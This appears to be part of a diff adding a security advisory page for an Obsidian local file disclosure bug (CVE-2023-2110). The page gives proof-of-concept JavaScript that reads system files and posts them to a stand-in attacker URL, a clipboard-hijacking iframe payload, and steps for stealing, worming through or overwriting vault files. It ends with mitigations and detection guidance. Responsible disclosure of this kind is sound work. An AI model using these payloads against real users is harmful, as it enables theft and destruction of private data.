+</span></span><span class="line"><span class="cl">            <span class="nx">filename</span> <span class="o">+=</span> <span class="s1">&#39;C:/Windows/win.ini&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">navigator</span><span class="p">.</span><span class="nx">platform</span><span class="p">.</span><span class="nx">startsWith</span><span class="p">(</span><span class="s1">&#39;Linux&#39;</span><span class="p">)){</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">filename</span> <span class="o">+=</span> <span class="s1">&#39;/proc/self/root/etc/passwd&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="p">}</span>
+</span></span><span class="line"><span class="cl">        <span class="kd">let</span> <span class="nx">r</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">XMLHttpRequest</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">r</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="nx">filename</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">r</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;load&#39;</span><span class="p">,</span> <span class="nx">e</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">            <span class="kd">let</span> <span class="nx">result</span> <span class="o">=</span> <span class="nx">e</span><span class="p">.</span><span class="nx">currentTarget</span><span class="p">.</span><span class="nx">responseText</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">result</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">confirm</span><span class="p">(</span><span class="nx">result</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="nx">fetch</span><span class="p">(</span><span class="s1">&#39;http://example.localtest.me/send-file-to-attacker-server&#39;</span><span class="p">,</span> <span class="p">{</span><span class="nx">method</span><span class="o">:</span> <span class="s1">&#39;post&#39;</span><span class="p">,</span> <span class="nx">mode</span><span class="o">:</span> <span class="s1">&#39;no-cors&#39;</span><span class="p">,</span> <span class="nx">body</span><span class="o">:</span> <span class="nx">result</span><span class="p">})</span>
+</span></span><span class="line"><span class="cl">        <span class="p">});</span>
+</span></span><span class="line"><span class="cl">        <span class="nx">r</span><span class="p">.</span><span class="nx">send</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>Save the above HTML file as <code>poc1.html</code> and serve it on a webserver, then append this line to any markdown file in Obsidian: <code>&lt;iframe src=&quot;http(s)://YOUR-WEB-SERVER/poc1.html&quot;&gt;&lt;/iframe&gt;</code>. Once the PoC is loaded in the iframe, it will:</p>
+<ol>
+<li>Try to read <code>C:/Windows/win.ini</code> on Windows, or <code>/etc/passwd</code> on Linux,</li>
+<li>Show the content of the file in a dialog,</li>
+<li>Send the file to external URL on <code>example.localtest.me</code> (this domain resolves to 127.0.0.1 for demonstration purposes only).</li>
+</ol>
+<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2110_03-poc1.gif" alt=""  />
+</p>
+<p><em>Note: A live version of poc1.html can be found at <code>https://o.cal1.cn/e6c33c0a905bde0f-obsidian-local-file-disclosure-poc/poc1.html</code></em></p>
+<h2 id="attack-scenario">Attack Scenario:<a hidden class="anchor" aria-hidden="true" href="#attack-scenario">#</a></h2>
+<h3 id="scenario-1-open-a-malicious-markdown-file">Scenario 1: Open a malicious markdown file<a hidden class="anchor" aria-hidden="true" href="#scenario-1-open-a-malicious-markdown-file">#</a></h3>
+<p>An attacker can inject an iframe tag in a markdown file and convince the victim to open it in Obsidian to trigger the payload.</p>
+<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2110_04-open-malicious-markdown-file-in-obsidian.gif" alt=""  />
+</p>
+<h3 id="scenario-2-copy-and-paste-from-a-webpage">Scenario 2: Copy and paste from a webpage<a hidden class="anchor" aria-hidden="true" href="#scenario-2-copy-and-paste-from-a-webpage">#</a></h3>
+<p>An attacker can craft a malicious webpage and hook on the <code>copy</code> event with the following code:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="cl"><span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">document</span><span class="p">.</span><span class="nx">addEventListener</span><span class="p">(</span><span class="s1">&#39;copy&#39;</span><span class="p">,</span><span class="nx">e</span><span class="p">=&gt;{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">e</span><span class="p">.</span><span class="nx">preventDefault</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">    <span class="kd">let</span> <span class="nx">payload</span> <span class="o">=</span> <span class="sb">`&lt;img src=&#34;)&lt;iframe style=&#39;display:none&#39; src=&#39;https://o.cal1.cn/e6c33c0a905bde0f-obsidian-local-file-disclosure-poc/poc1.html&#39;&gt;&lt;/iframe&gt;![](&#34;&gt;`</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">e</span><span class="p">.</span><span class="nx">clipboardData</span><span class="p">.</span><span class="nx">setData</span><span class="p">(</span><span class="s1">&#39;text/html&#39;</span><span class="p">,</span> <span class="nx">payload</span> <span class="o">+</span> <span class="nb">window</span><span class="p">.</span><span class="nx">getSelection</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">  <span class="p">})</span>
+</span></span><span class="line"><span class="cl"><span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>
+</span></span></code></pre></div><p>When the victim copies text from this page, the payload is added to the copied content and will be triggered when it is pasted into Obsidian.</p>
+<p><em>Note: A live version of copy-and-paste PoC can be found <a href="https://o.cal1.cn/e6c33c0a905bde0f-obsidian-local-file-disclosure-poc/cp.html">here</a>.</em></p>
+<p><img loading="lazy" src="/advisories/23/images/CVE-2023-2110_05-copy-and-paste.gif" alt=""  />
+</p>
+<h3 id="additional-notes">Additional Notes:<a hidden class="anchor" aria-hidden="true" href="#additional-notes">#</a></h3>
+<ol>
+<li>
+<p>It is possible to add <code>style=&quot;display:none&quot;</code> attribute to the iframe to make the exploit invisible.</p>
+</li>
+<li>
+<p>An attacker can get a list of recently opened vaults from:</p>
+<ul>
+<li><code>app://local/proc/self/cwd/.config/obsidian/obsidian.json</code> on Linux, or</li>
+<li><code>app://local/..%252f..%252fRoaming%2fObsidian%2fobsidian.json</code> on Windows</li>
+</ul>
+<p>Then get a file list of each vault from <code>app://local/PATH-TO-VAULT/.obsidian/workspace.json</code>, and finally reads every file in the vault. In another word, an attacker can exploit this vulnerability to leak most of the contents in the victim&rsquo;s vaults.</p>
+<p><em>An example of such exploit can be found at <code>https://o.cal1.cn/e6c33c0a905bde0f-obsidian-local-file-disclosure-poc/poc2.html</code></em></p>
+</li>
+<li>
+<p>Once the attacker obtained vault id from <code>obsidian.json</code>, it is possible to append arbitrary content to existing markdown files via <code>obsidian://new</code>.</p>
+<p>For example, executing <code>location = 'obsidian://new?file=Untitled.md&amp;vault=56cc6ab7be5a53d5&amp;append=1&amp;content=appended-content'</code> will add &ldquo;appended-content&rdquo; at the end of <code>Untitled.md</code> in the specified vault. This would make this vulnerability wormable, as the attacker is able to append the same payload invisibly to the victim&rsquo;s other markdown files.</p>
+<p>It is also possible for attacker to purge the files via the <code>overwrite</code> param: <code>location = 'obsidian://new?file=Untitled.md&amp;vault=56cc6ab7be5a53d5&amp;overwrite=1&amp;content=REMOVED'</code>. This will seriously compromise the integrity of the user&rsquo;s data.</p>
+</li>
+</ol>
+<h2 id="suggested-mitigations">Suggested Mitigations:<a hidden class="anchor" aria-hidden="true" href="#suggested-mitigations">#</a></h2>
+<p>Prohibit http(s) webpages from accessing <code>app://</code> resources. It is also recommended to limit the local resources to be loaded only from the current vault directory.</p>
+<p>For end users who are using the versions affected by this vulnerability, it is suggested that (1) any untrusted markdown file or canvas file should not be opened in Obsidian, and (2) copying text from an untrusted webpage then pasting it into Obsidian should be avoided.</p>
+<h2 id="detection-guidance">Detection Guidance:<a hidden class="anchor" aria-hidden="true" href="#detection-guidance">#</a></h2>
+<p>It is possible to detect the exploitation of this vulnerability by checking the presence of <code>iframe</code> tags loading suspicious URLs in markdown files.</p>
+<h2 id="credits">Credits:<a hidden class="anchor" aria-hidden="true" href="#credits">#</a></h2>
+<p>Li Jiantao (<a href="https://twitter.com/CurseRed">@CurseRed</a>) of STAR Labs SG Pte. Ltd. (<a href="https://twitter.com/starlabs_sg">@starlabs_sg</a>)</p>
+<h2 id="timeline">Timeline:<a hidden class="anchor" aria-hidden="true" href="#timeline">#</a></h2>
+<ul>
+<li>2023-04-28 Vendor Disclosure</li>
+<li>2023-05-03 Vendor Patch Release</li>
+<li>2023-08-19 Public Release</li>
+</ul>
+
+
+  </div>
+
+  <footer class="post-footer">
+    <ul class="post-tags">
+    </ul>
+<nav class="paginav">
+  <a class="prev" href="https://starlabs.sg/advisories/23/23-38625/">
+    <span class="title">« Prev</span>
+    <br>
+    <span>(CVE-2023-38625) Trend Micro Apex Central 2019 (&lt;= Build 6394) Authenticated SSRF</span>
+  </a>
+  <a class="next" href="https://starlabs.sg/advisories/23/23-2316/">
+    <span class="title">Next »</span>
+    <br>
+    <span>(CVE-2023-2316) Typora Local File Disclosure</span>
+  </a>
+</nav>
+
+  </footer>
+</article>
+    </main>
+    
+<footer class="footer">
+    <span>&copy; 2024 <a href="https://starlabs.sg/">STAR Labs</a></span>
+    <span>
+        Powered by
+        <a href="https://gohugo.io/" rel="noopener noreferrer" target="_blank">Hugo</a> &
+        <a href="https://git.io/hugopapermod" rel="noopener" target="_blank">PaperMod</a>
+    </span>
+</footer>
+<a href="#top" aria-label="go to top" title="Go to Top (Alt + G)" class="top-link" id="top-link" accesskey="g">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentColor">
+        <path d="M12 6H0l6-6z" />
+    </svg>
+</a>
+
+<script>
+    let menu = document.getElementById('menu')
+    if (menu) {
+        menu.scrollLeft = localStorage.getItem("menu-scroll-position");
+        menu.onscroll = function () {
+            localStorage.setItem("menu-scroll-position", menu.scrollLeft);
+        }
+    }
+
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+        anchor.addEventListener("click", function (e) {
+            e.preventDefault();
+            var id = this.getAttribute("href").substr(1);
+            if (!window.matchMedia('(prefers-reduced-motion: reduce)').matches) {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView({
+                    behavior: "smooth"
+                });
+            } else {
+                document.querySelector(`[id='${decodeURIComponent(id)}']`).scrollIntoView();
+            }
+            if (id === "top") {
+                history.replaceState(null, null, " ");
+            } else {
+                history.pushState(null, null, `#${id}`);
+            }
+        });
+    });
+
+</script>
+<script>
+    var mybutton = document.getElementById("top-link");
+    window.onscroll = function () {
+        if (document.body.scrollTop > 800 || document.documentElement.scrollTop > 800) {
+            mybutton.style.visibility = "visible";
+            mybutton.style.opacity = "1";
+        } else {
+            mybutton.style.visibility = "hidden";
+            mybutton.style.opacity = "0";
+        }
+    };
+
+</script>
+</body>
+
+</html>
